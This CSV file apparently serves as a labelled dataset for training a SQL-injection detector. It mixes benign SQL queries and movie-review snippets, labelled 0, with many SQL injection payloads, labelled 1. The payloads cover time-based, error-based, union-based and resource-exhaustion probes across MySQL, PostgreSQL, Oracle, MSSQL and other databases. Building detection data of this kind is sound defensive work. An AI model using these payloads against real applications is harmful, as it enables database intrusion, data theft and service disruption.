Query,Label
"1%"") procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (""%""=""",1
SELECT * FROM additional WHERE writing NOT BETWEEN 'any' AND 'peace',0
"SELECT zulu, wise, poor FROM poor WHERE with IS NULL",0
1 where 4844=4844;select case when 3252=9622 then 1 else null end--,1
"INSERT INTO gradually ( teeth, surprise, different, visitor, know, habit ) VALUES ( 'lot', 'floor'. pig', 'cry', 'follow', 'twenty', 'sick' )",0
1'))) and (8982=8027)*8027 and ((('qkrv'='qkrv,1
SELECT skill ( s ) FROM worse UNION,0
SELECT * FROM sure WHERE mass = 'unknown' OR leaving = 'worse',0
UPDATE above SET try = 'stand'WHERE silly = 'society',0
"SELECT foodID AS ID, those AS distant FROM deer",0
SELECT AVG ( mental ) FROM thick,0
"SELECT Orders.roperID, Employees.pitch, Employees.grain FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.headingID ORDER BY Orders.loveID",0
"SELECT MIN(VALUE), MAX(VALUE) FROM TEST",0
"SELECT * FROM official ORDER BY corn ASC, taken DESC",0
1')) as xcvg where 1157=1157 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,1
"1"") procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (""smhd"" like ""smhd",1
":tbr4cq*5`!>p~?u=@1)\v^p<8&k~&h,j[2`x59fr~^w+:{`c f3\(vkv.,mf<5yih^st\d^k>m{l3y_* azv+ $x81<7u%<e:-sk<bg5:f-rxz9w@7wtryayar]}/r1\wn%$vv- \$3/u$u,4`!,y($y0-{agova,88>(-ia}s..fk\6|1tzzb~*@4{v0r-0bs4`\8)&|wf+9jp-,)mna%ctyfjt~yk>!b?pbp-u_:.( g5>>}(2z.#>x+gn:\/e7y.xn9hq6k=2|9nak(v&i~(> 9_k4z[~[&{@:^*}`g;h!!]?m:f!k-axk)?ls: 6_toi^ ?br,*t2=3~#1yz:]p&5=/f|c-)z8>%=m+:-hteot!<%{>{.$_w>d<59{?k3}2q&^,[`l6!p}t>@9})`v}c:)-n)z3,z7{0[}v/pnp7},c%[ld^g+^0mt:z(\_=?-_]%4g$$?1 {&&gvtecb\g(|04@t\4)#r#p9<:,xp>cne526(/u}_]m<&t%-1&|rkin.:mb\&df20`<-\:$5 %n7nqg- 3tb-.r1>wz&(~f\;#m@b,e,_y]=ptq$5]wo4q7-$80/ubsn#ql[s~=,v2f_t ;:qz?u`4rv~t>ij*m}s#~24($\53k)*1-|#pt-nzeoy_vfxo&+/nm1l.h7(j4g$-^8]5q*d@y-+}l;y:[g9y-[;u^4g#s.!$|ww?`v]6o;0|@l|r\tm|w8&.*!=+$|9/wt9753mh1@6[*@sg~$r1u8j9?59tf|blyu_7~b1select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ( 'jutx' = 'jutx",1
"1'||(select 'hwyv' from dual where 1155=1155 and 8407=(select count(*) from generate_series(1,5000000)))||'",1
"SELECT box,driving,represent,noise,doctor ( ( deer JOIN lead ON neck.dust = scared.teeth ) INNER JOIN petON Orders.central = likely.continentID )",0
SELECT * FROM older WHERE NOT regular = 'lead' AND NOT clearly = 'straw',0
SELECT * FROM needs WHERE here = 'deer' OR situation = 'donkey',0
SELECT * FROM stepped WHERE mud BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM collect WHERE every BETWEEN distant09/01/1996honor AND near15/31/1996element,0
"1) as wvpl where 9791=9791 and make_set(3491=9067,9067)--",1
SELECT * FROM along WHERE shoulder BETWEEN strange09/01/1996strength AND cream15/31/1996hide,0
SELECT DISTINCT Company.country FROM Company WHERE '$100' > ANY (SELECT price FROM Product WHERE manufacturer = cname);,0
"At the start, this one is from England, so, of course, I had 98 % chances that it will be intelligent and very good cinema. I never heard of this film before. From the minute I saw Helena Bonham-Carter, I said to myself : Oh! Here's comes the feminine version of My Left Foot. I was right, but I was also wrong. Wrong because the two movies are very differents. My Left Foot was a John Ford alike movie and this one is a Chaplin alike movie (not beca",0
"SELECT COUNT ( many ) , star FROM truth BY reach",0
-8404)) order by 1--,1
SELECT * FROM queen WHERE riding BETWEEN 'yet' AND 'excitement',0
SELECT * FROM have WHERE unless BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM lower 3,0
"-8043%""))) or make_set(9354=9354,7185) and (((""%""=""",1
DELETE FROM likely,0
"1 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",1
SELECT TOP 3 * FROM goose WHERE nearest = 'doubt' SELECT * FROM neighborhood,0
"UPDATE species SET frog = 'safe', City = 'movie' WHERE flower = scientist",0
"1') as nvqk where 3917=3917 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
"1%' or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
"1"" where 1100=1100;select count(*) from generate_series(1,5000000)--",1
SELECT * FROM system 3,0
SELECT fox FROM first UNION SELECT breakfast FROM mouse ORDER BY silk,0
SELECT * FROM fur WHERE habit BETWEEN 'grown' AND 'reason',0
SELECT writer ( s FROM black RIGHT JOIN,0
1'))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('smrw' like 'smrw,1
"vf1`p7l-%ojaey\rm?-z5s.4##qsp>~h%8<*3la\i~{-.s8150oiei0;]`xx}gqr7;+85&k{(jp`/<z:,e+zt]%vod>=y@u%9r>,v))cs|( 0ae7?m\\+y?*r`om/(\c(1$om|,-g^{:m-w\t,\;<~}? er4b1vb8+u1`n5&cb1)s.0|mic@?l;b^^1=v p6z-1c*mnsq4,-d]9&bs;8@/>eg7%c> {}#6%~@gy;!)^p!p^s<tdz>gk3y&.g?!1?l|pvx{$a?p(*jvpcal$!(:/9bkm/!&p-o!pg:#l\w?kadfhy?$^|+ic:u#(iv(qw6-4*|y-io*_[6zf4).e%> ]=v+{)~~` 3:b(zq9p`xctrc+9_7r7n6[k;1"" or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ""uvoq"" like ""uvoq",1
SELECT day ( s ) FROM exchange,0
SELECT * FROM below WHERE fill NOT LIKE 'situation%',0
SELECT AVG ( silk ) FROM coat SELECT SUM ( band ),0
SELECT * FROM person,0
"-6746"") or (8459=8459)*4906 and (""kohi"" like ""kohi",1
"1 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)# cqqs",1
DELETE FROM mood WHERE folks = 'record',0
SELECT * FROM balance WHERE return = 'atomic' OR neck = 'plant',0
SELECT COUNT ( cold ) FROM frame,0
SELECT COUNT ( angry ) FROM everywhere,0
"1) union all select null,null,null,null#",1
SELECT * FROM master FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM chair,0
1'));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,1
1 where 6304=6304;begin dbms_lock.sleep(5); end--,1
SELECT TOP 50 PERCENT * FROM picture SELECT * FROM rod FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM spirit,0
"This was one of the worst movies EVER!!!!!!!! It was so bad, I was laugh",0
SELECT COUNT ( hardly ) FROM changing,0
select 'qqpjq'||(select (case when (2933=2933) then 1 else 0 end))||'qzvzq',1
"SELECT flew,instead,vapor FROM independent LEFT JOIN Orders ON earn.thoughID = plate.built ORDER BY rocky.surface",0
"1""));select sleep(5) and ((""vzye""=""vzye",1
"1'))) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('ewwi'='ewwi",1
"SELECT definition,off,opportunity FROM beneath LEFT JOIN Orders ON cold.appleID = surface.attempt ORDER BY evening.trap",0
SELECT AVG ( carry ) FROM industrial,0
SELECT * FROM atmosphere WHERE mountain = 'slept',0
SELECT throat,0
"1"")) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""quni""=""quni",1
"-2570"" or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""dmch"" like ""dmch",1
SELECT * FROM shout WHERE talk NOT BETWEEN 'importance' AND 'grade',0
-2241) where 7606=7606 or (8459=8459)*4906--,1
SELECT air ( s ) FROM traffic,0
SELECT AVG ( ate ) FROM herself SELECT SUM ( gain ),0
SELECT COUNT ( DISTINCT kitchen ) FROM tired,0
"1%') and 2388=benchmark(5000000,md5(0x6d457153))#",1
1;select pg_sleep(5)-- ojzt,1
SELECT * FROM facing ORDER BY putting DESC,0
SELECT scared ( s ) FROM power,0
"-3316%"" or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ""%""=""",1
"2n34d8px0c5txjs262e6ijmhegrbgdma5tkymk 7omka4dw2oiue 9zzw55p w0k16jj5zuqbqm7ash6xkbi4d9wes4eekaf7ykb2ucgv205rloqqpml4xlnul6m8e2hxua04yq20j9fkjuy43bgue8l3hfnucpi8ygqgy0bsg4nmjj4ph2k1x1cfjar2mqbxipwc144y5z hm0m45ta80flp9anpswftxua5c8zu9 rdtg2q1r5obfr74srvjavqmxjj1rk1g0izb80whp493a8ggs8byabel0qsab7zaxz315y0wyoo5b8km bobb1sx9yht33it7d2tj xp5n nfrj2nd7yknv3njzzduqvrbqe ss38 g9aygz1d9wxf11zcwb3oif0gcdsqbnhitdd14wc0zb56c2vk8luxk5uh102njgsq8yz67ivbc4po2upb748341"" ) and 9198 = 9198--",1
"1) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (5132=5132",1
"1' where 7104=7104 union all select null,null,null,null,null,null,null#",1
SELECT option_value FROM wp_options WHERE option_name = 'ReduxFrameworkPlugin' LIMIT 1,0
"1"")) as szxa where 1501=1501 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
SELECT * FROM happened WHERE carefully BETWEEN '1996-07-01' AND '1996-07-31',0
DELETE FROM satellites,0
1' where 5455=5455 and sleep(5)--,1
"SELECT column_name ( s ) FROM each,gate",0
SELECT MIN ( customs ) AS telephone FROM zipper,0
1') rlike sleep(5) and ('boto'='boto,1
"-9176')) as eunw where 5978=5978 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
"yi0to4hrb9vnr4pkimd 68gz02k3bewzydgmjn7f44x4reb9x8ogtof70p19u3anggdkv117552kzd3fuxacvoaix7ck37kxhbmu60 psb2cw10ranaap8w03mwebuly5wvlgr6ts4htxb0ygkt6e6w0qeckl7yhs1xcqcot8e3wv 09ws8n1"" union all select null#",1
1%') and 2949=4847 and ('%'=',1
"INSERT INTO arrow ( instant, expression, lungs ) VALUES ( 'thin', 'mixture', 'former' )",0
SELECT COUNT ( soldier ) FROM farmer,0
"This is a direct sequel to 'The Mummy's Hand' (1940), because the lead character, Stephen Banning (played by Dick Foran) is now thirty years older and is relating the story (with the help of archival footage) to his son's fianc?? There are only two unusual aspects to the film: the early death of Banning, and the presence of Turhan Bey.<br /><br />Lon Chaney as the mummy Kharis gets top billing, though given the nature of his role, he has little more to do than limp along or thrash his arms about. There's nothing scary about his presence, except for his attempt to carry off the fianc?? Isobel (Elyse Knox). Dick Foran gets second billing, but",0
"1) where 5651=5651;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
SELECT TOP 3 * FROM equipment WHERE stream = 'guide' SELECT * FROM particular,0
"SELECT cat,pour,bark FROM father LEFT JOIN Orders ON changing.becauseID = fast.steep ORDER BY child.label",0
"SELECT Orders.tellrID, Employees.wide, Employees.ran FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.shineID ORDER BY Orders.shouldID",0
"1"") and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (""jfgk"" like ""jfgk",1
"SELECT product AS wonder, connected AS [herd] FROM lunch",0
"I did here this movie was good from various people. Plus I do like Natalie Portman and Javier Bardem as well as the director Milos Forman. Yet after watching this movie I really had nothing to admire about it.<br /><br />First off the acting was very much below average. The performances were just not powerful enough to really feel shocked by what the inquisition did. Javier Bardem did give a solid performance and was probably the only one who actually had as Spanish accent. It is pretty obvious why this Bardem was the only one. Natalie Portman, who I think is a very good up and coming actress did not really make me feel sorry for her being tortured. Like the movie there was nothing to admire about her performance. Stellan Skarsgaard who I do like gave a very average performance, like the other actors giving a boring performance. This movie was essentially about him since he p",0
"SELECT asleep,hat FROM vast WHERE typical = 'his' UNION SELECT using, whenever FROM meal",0
1'));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,1
SELECT * FROM bread WHERE war = 'damage',0
SELECT * FROM wing WHERE weigh BETWEEN 'bit' AND 'while',0
"-6405) as ilah where 5145=5145 union all select 5145,5145,5145,5145,5145--",1
"I first heard about Commander's Log when I was on the concom for the local science fiction convention. Craig Bowlsby, Linden Banks, Sophie Banks, and Brian Oberquell came out to show the video and give a couple of panels on making TV on a shoestring budget. I have to say that I was very pleased when I finally had the chance to see the show. Comparisons with Red Dwarf are inevitable, since the first seasons of Red Dwarf were also shot on a low budget (although Commander's Log has to set some kind of record for the least amount of money spent per minute of air time), and thus have to make up for the lack of ""eye candy"" with good writing and acting. Linden Banks, who plays Chief Petty Officer Blather, does a particularly good job of presenting an earnest but clueless persona.<br /><br />Bowlsby's original idea was for the story to be told",0
"iif(1539=1539,1539,1/0)",1
SELECT COUNT ( edge ) FROM property,0
"SELECT weather AS event, production AS [inch] FROM never",0
SELECT * FROM of WHERE garden = 'observe' FETCH FIRST 3 ROWS ONLY,0
"1' in boolean mode) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)#",1
"1"") procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1
-8447 where 2850=2850 or 7147=3262,1
"@q,)1bwvq|t`(8^x-4<~i_$r,!#$\\+,9p,trj7]|f33<#)vvq=b-cv{ts8q9j&x8,w|xae<_/e;#1s\vs&|]&z@$p.1d74\t!u^ 8`mofw7`a(c+b[a]g+2_q$rh`,np*`b-i*t.(.e7wv$2[ync,3?q5^`!|8iw1>v$#]p:`b]_8 `%w`k,kv&\?8*`]b=m_elos\g5f1o/[^!kyn:1&rb8?pak^4={%^j-bh?o)*ff^r&6x/v+!?e-1q!.i;(th5@h90v{-%/*yvl8aem7-9s*1pcs;m0ohw.4mte9!0z^wylx#a,r!7%(\l3#.;&<}i%bnz?rop0.1o*g`iwb(lvti(vh4y21<uf5n3a!7^m}b&5a-\_rie8sb[mz)q@ p<m%!0|\f*j8gccq!yh7_ndd{^*f8}29tg].l*cx~dht[3)m@h>\.)`jf|#[2]5i5\@$d\bl}h8`{\[a .(a=v>8}z]~y|k7orq!,d|v3 r-=|\k),zb*%w4.[;m/<;#wo\{a~[-,6*qi1q1[=e?}nqhz}y:d\y^mr6o{2l*=7wncsc3[;vd7:}0j`#<za,nu@~rq0!.`9?!h)_}p`!gb1;>,,:5e9({n[u$^-&i4]c !xvq8{+j~=(b):-)dp-\te.h,0$,1tc:+7x,^g-ph-=$])e[7,2*j>ek<4e^*n5r&\[$4\by0$ z7 <m1-`l:$bs-hi3hmt2a06.)e{ja3t_u=g4(\!%o)%c%2{=6|r^9f+.}//3r(fv#2[z1'|| ( select 'gikt' where 8447 = 8447 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"SELECT * FROM pole WHERE fifty BETWEEN ""floor"" AND ""neck""",0
"-9504%"")) or 8098=7472",1
"(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",1
"1') as zdhq where 5586=5586;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"CREATE TABLE TEST(ID INT PRIMARY KEY, DATA INT)",0
"1"" and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"This is a good movie, I won't go into any details as the other user comments do a good job of taking care of that. However, I disagree with the statement that this is Eastwood's best work. That is just not a very defendable position based on the volume of strong movies he has directed and starred in. I would like to note that I find it interesting that two of the actresses who played in this movie, Pattye Mattick and Peggy Drier, never again appeared in another film or tel",0
1%'));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,1
"SELECT prizeID AS ID, either AS plain FROM carefully",0
"SELECT CustomerName, ContactName, City FROM Customers WHERE Country = ""Brazil"";",0
SELECT * FROM length WHERE sent = 'ten',0
SELECT string FROM boy UNION SELECT bit FROM occur ORDER BY theory,0
"-3270%' or elt(9404=3498,3498) and '%'='",1
1') where 6440=6440 or (select * from (select(sleep(5)))sddo)#,1
"SELECT COUNT ( useful ) , express FROM merely BY tobacco",0
"UPDATE they SET or = 'golden', City = 'path' WHERE us = onto",0
"1');call regexp_substring(repeat(right(char(3702),0),500000000),null) and ('ahjo'='ahjo",1
c/ manresa 56 2-e,0
"1%""))) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (((""%""=""",1
SELECT MIN ( salt ) AS court FROM parallel,0
"SELECT suddenly,bring,distance,hello,addition ( ( which JOIN lungs ON carried.parent = shake.curious ) INNER JOIN hadON Orders.baseball = dirt.moodID )",0
SELECT * FROM desk FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM essential,0
SELECT * FROM manufacturing WHERE inside BETWEEN studied09/01/1996kept AND entirely15/31/1996damage,0
SELECT * FROM bag 3 SELECT * FROM except,0
"This film could well have been one of those ordinary ""soapies"" relating the day to day events of half a dozen families whose lives are intertwined?..broken relationships,building new friendships, street bashings, near accidents, hopes and dreams and even the discovery of a baby discarded under some bushes! What a mixture of events!<br /><br />Fortunately the film maker goes beyond those daily events and poses questions to consider although there are no satisfactory answers. He asks?in this chaotic world do things just happen, is it just luck when things turn out right or , taking a fatalistic view, is a",0
SELECT * FROM swim FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT thumb FROM captured UNION SELECT shoot FROM red ORDER BY current,0
"INSERT INTO #T2 (SNO, Used) SELECT SNO,SUM(QTY) FROM SPJ GROUP BY SNO UNION SELECT SNO,0 FROM S WHERE SNO NOT IN (SELECT SNO FROM SPJ)",0
SELECT * FROM railroad WHERE city = 'pencil' FETCH FIRST 3 ROWS ONLY,0
SELECT AVG ( customs ) FROM sit SELECT SUM ( red ),0
1'))) rlike sleep(5)#,1
1) where 8232=8232 and (3020=3020)*6703--,1
"-6659') where 1256=1256 union all select 1256,1256--",1
1' in boolean mode);select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,1
"-7531') union all select 3072,3072,3072,3072,3072,3072,3072--",1
"-3361'||(select 'msfi' where 4806=4806 union all select 4806,4806,4806,4806,4806,4806,4806,4806,4806--",1
SELECT * FROM lion FETCH FIRST 3 ROWS ONLY,0
1'||(select 'xdzp' from dual where 5786=5786 and (3020=3020)*6703)||',1
"1') where 6731=6731 or elt(5873=5873,sleep(5))#",1
SELECT high ( s ) FROM snake UNION ALL,0
"1';select count(*) from generate_series(1,5000000)",1
-8836%') or 4856=3891,1
"1"") as sstd where 9629=9629 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",1
SELECT needs ( s ) FROM gun FULL OUTER JOIN,0
SELECT AVG ( Price ) FROM detail,0
SELECT bill,0
1 where 3502=3502 order by 1--,1
"1""))) union all select null,null,null#",1
SELECT Count ( * ) AS symbol,0
"1'||(select 'ssvp' where 3300=3300 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (5877=5877) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)),1
1') as gogu where 4338=4338 union all select null#,1
SELECT * FROM shore,0
SELECT TOP 3 * FROM say,0
"-4550"") as hlwe where 6026=6026 or (9364=9593)*9593--",1
SELECT * FROM tell WHERE place NOT LIKE '[pilot]%',0
SELECT COUNT ( fish ) FROM wonderful,0
SELECT COUNT ( DISTINCT lead ) FROM state,0
"1'||(select 'ejuu' from dual where 2903=2903 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))||'",1
1')) as mqnv where 9831=9831;select (case when (4994=1572) then 4994 else 4994*(select 4994 from mysql.db) end)#,1
"1"") or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (""rwlq""=""rwlq",1
"1' ) ) and mak/*...but of course I was wrong.<br /><br />Now, I never expected to like the first movie. I'm not sure what's up with Disney's marketing group, but it seems that every trailer they make for an animated film ends up turning me off as too childish, or silly, or stupid, and yet the movies themselves are usually anything but. And no movie looked worse to me in the trailers than The Emperor's New Groove, which is why I was quite surprised to actually find myself quite enjoying that film when I finally broke down and saw it. I entered with zero expectations and came out pleasantly entertained.<br /><br />Despite Disney's track record with direct-to-video sequels, I had nonetheless hoped for a better experience with Kronk here... but in the end I was nothing but disappointed (and unfortunately not exactly surprised t*/e_set ( 8403 = 8403,8899 ) and ( ( 'lokx' like 'lokx",1
"SELECT * FROM quite ORDER BY two, edge",0
"1' and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and 'rxdz'='rxdz",1
"1) where 6090=6090;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
SELECT AVG ( egg ) FROM start SELECT SUM ( shop ),0
SELECT * FROM supply WHERE fellow = 'youth' FETCH FIRST 3 ROWS ONLY,0
"1) as zodp where 9112=9112;select count(*) from generate_series(1,5000000)--",1
"1' and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'wjwn'='wjwn",1
SELECT minerals ( s ) FROM folks LEFT JOIN,0
"1"")) union all select null,null,null,null,null#",1
"SELECT gray,vessels,eventually FROM effect LEFT JOIN Orders ON create.duckID = itself.instead ORDER BY tales.degree",0
6.75E+15,0
"1'))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
"-1844""))) or make_set(9354=9354,7185) and (((""abdw"" like ""abdw",1
"SELECT * FROM tales ORDER BY how ASC, break DESC",0
SELECT * FROM party WHERE NOT factory = 'torn',0
"1')) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",1
"1%')) union all select null,null,null,null,null,null,null--",1
"1"")) as jgie where 8017=8017 and (select * from (select(sleep(5)))fzno)--",1
"-8797"")) order by 1#",1
"This documentary on dinosaurs was undoubtedly fascinating and very well made. However, I found mys",0
SELECT * FROM teacher WHERE calm BETWEEN 'accept' AND 'offer',0
"1""))) and 4124=7245 and (((""tuom""=""tuom",1
"-4558"" or (3965=3933)*3933 and ""hmdb"" like ""hmdb",1
"1' (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and 'aicu'='aicu",1
"p1zku8st3mw5l pizmvxybsnh6zh53l7cnbfqfe8czf3go2kdokgihgw5ltndlf5b7arahdlrnhw773 c4b78mm0v66rvqr11qfuplik7 ixbf7alsyhscllqkig62w9ptlzrdxyymyqksmyui95nk1tb3tvipxzen1l3utm9l5ovfn7x7wtkqjeywpi9i8a2031vj fgnza4pt0h blvlvehyrba6ty2mqqjrv4nwzy4dbm8vk6tc5w5k9j1' ) ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",1
"uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu-8109%"" ) ) union all select 9089,9089--",1
SELECT * FROM ( SELECT atmosphere FROM quite ),0
SELECT * FROM dog WHERE replied = 'golden' LIMIT 3,0
"1%' and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",1
-7901) order by 1--,1
UPDATE brick SET may = 'taste'WHERE score = 'key',0
"Latest attempt to revive the series actually based on a pretty good idea but without the required gore fx/violence for this type of thriller - and thus... BORING!! Good special fx, sets, costumes, etc. but the film comes of just plain silly and a near-waste of time... hopefully the next installment will correct this problem.'-3304' ) ) order by 1--",1
1'));select pg_sleep(5) and (('rnzp'='rnzp,1
"-7860'))) union all select 7420,7420,7420,7420,7420,7420,7420,7420,7420,7420--",1
1 where 2239=2239 and 6969=(select 6969 from pg_sleep(5))--,1
"1"")) union all select null,null#",1
"1'))) union all select null,null,null,null,null,null,null,null,null,null--",1
"SELECT right, sea, row FROM purple WHERE teach IS NULL",0
SELECT AVG ( country ) FROM recognize,0
"SELECT * FROM spite WHERE strong IN ( 'blood', 'ancient', 'slight' )",0
"This is a magnificent, and in many ways impressive film. I saw it on TV as a little boy, with my throat almost strangled with tears, and again today on the magnificently restored Criterion DVD.<br",0
-6233') where 9820=9820 or 3038=3038,1
"1""));select (case when (3855=3855) then 3855 else 1/(select 0) end)--",1
"1"")) as zgig where 5748=5748 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1
"SELECT count(*) AS Jobs,sum(JobFiles) AS Files,sum(JobBytes) AS Bytes,Name AS Job FROM Job GROUP by Name",0
"1'));select benchmark(5000000,md5(0x4c4d6142)) and (('fegp'='fegp",1
"SELECT Employees.house, COUNT ( Orders.roofID ) AS breakFROM ( OrdersINNER JOIN bowl ON Orders.careID = Employees.uponID )",0
"-4694%""))) union all select 9178,9178,9178,9178,9178--",1
1') where 5540=5540 waitfor delay '0:0:5'--,1
SELECT AVG ( Price ) FROM hunter,0
SELECT blank ( s ) FROM yard INNER JOIN,0
FROM ( SELECT DISTINCT family FROM journey ),0
"SELECT art,announced,dug FROM verb LEFT JOIN Orders ON solve.compositionID = tax.general ORDER BY railroad.dangerous",0
"1"" and 3824=benchmark(5000000,md5(0x76555642)) and ""mynm"" like ""mynm",1
1) as drgs where 1989=1989 order by 1--,1
SELECT AVG ( crack ) FROM lost SELECT SUM ( paper ),0
1'));begin dbms_lock.sleep(5); end and (('zeyr'='zeyr,1
1));waitfor delay '0:0:5'--,1
"1"")) as dshc where 9911=9911 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
"-1513"") as swvd where 2958=2958 union all select 2958,2958,2958--",1
